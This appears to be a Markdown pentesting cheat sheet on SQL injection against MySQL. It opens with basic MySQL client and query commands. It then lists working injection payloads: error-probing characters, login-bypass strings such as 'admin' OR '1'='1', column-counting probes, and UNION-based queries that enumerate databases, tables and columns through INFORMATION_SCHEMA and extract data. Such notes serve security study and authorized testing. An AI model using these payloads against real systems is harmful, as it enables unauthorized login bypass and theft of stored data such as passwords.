# SQLi

## MySQL Basics

### Connect to a MySQL Database
```zsh
mysql -u <user> -h <host> -P <port> -p<pass>
```

### Enumerate Databases
```MySQL
SHOW Databases;
```
```MySQL
USE <database>;
```

### Enumerate Tables
```MySQL
SHOW TABLES;
```

```MySQL
DESCRIBE <table>;
```

### Retrieve Data
```MySQL
SELECT * FROM <table>;
```

```MySQL
SELECT <column1>,<column2> FROM <table>;
```

```MySQL
SELECT <column1>,<column2> FROM <table> ORDER BY <column2>;
```

```MySQL
SELECT <column1>,<column2> FROM <table> WHERE <condition>;
```

## SQL Injection
### Check for errors with:
```MySQL
'
```
```MySQL
"
```
```MySQL
#
```
```MySQL
;
```
```MySQL
)
```

### Bypassing a Log in Portal
```MySQL
admin' OR '1'='1
```
```MySQL
admin'-- 
```

### Using a UNION Clause
Remove or add from "2, 3, 4" as needed because the columns need to be "even"
```MySQL
SELECT * from <table> where <column> = '1' UNION SELECT username, 2, 3, 4 from passwords-- '
```

### Detecting the Number of Columns
```MySQL
' order by n-- 
```
where n is the max value that does not cause an error.


-or-

```MySQL
' UNION select 1,2,3-- 
```

### Locating Output
A webapp may or may not display the results of each column. Take note of where the locations of the 1, 2, or 3 are.

### Fingerprinting MySQL Database
#### Current Database
```MySQL
' UNION select 1,database(),2,3-- 
```

#### Find other Databases
```MySQL
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
or
```MySQL
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```

#### Enumerate Tables
```MySQL
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'-- 
```

#### Enumerate Columns
```MySQL
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- 
```

#### Extract Data
```MySQL
' UNION select 1, column1, column2, 4 from <database>.<table>-- 
```

